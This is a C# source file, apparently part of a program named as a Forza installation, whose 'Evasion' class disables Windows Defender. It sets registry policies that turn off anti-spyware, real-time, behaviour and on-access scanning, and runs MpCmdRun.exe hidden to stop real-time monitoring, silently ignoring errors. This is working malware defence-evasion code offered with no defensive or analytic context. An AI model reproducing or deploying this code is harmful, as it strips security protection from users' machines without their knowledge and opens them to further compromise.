using System.Diagnostics;
using Microsoft.Win32;

namespace ForzaInstallation.Evasion
{
    internal static class DefenderDisable
    {
        internal static bool Disable()
        {
            bool ok = false;
            try
            {
                using (var key = Registry.LocalMachine.CreateSubKey(@"SOFTWARE\Policies\Microsoft\Windows Defender"))
                {
                    if (key == null) return false;
                    key.SetValue("DisableAntiSpyware", 1, RegistryValueKind.DWord);
                    ok = true;
                }
            }
            catch { }
            try
            {
                using (var key = Registry.LocalMachine.CreateSubKey(@"SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection"))
                {
                    if (key == null) return ok;
                    key.SetValue("DisableRealtimeMonitoring", 1, RegistryValueKind.DWord);
                    key.SetValue("DisableBehaviorMonitoring", 1, RegistryValueKind.DWord);
                    key.SetValue("DisableOnAccessProtection", 1, RegistryValueKind.DWord);
                    key.SetValue("DisableScanOnReboot", 1, RegistryValueKind.DWord);
                    ok = true;
                }
            }
            catch { }
            try
            {
                var psi = new ProcessStartInfo("MpCmdRun.exe", "-DisableRealtimeMonitoring")
                {
                    UseShellExecute = false,
                    CreateNoWindow = true,
                    WindowStyle = ProcessWindowStyle.Hidden
                };
                using (var p = Process.Start(psi)) { p.WaitForExit(15000); }
                ok = true;
            }
            catch { }
            return ok;
        }
    }
}
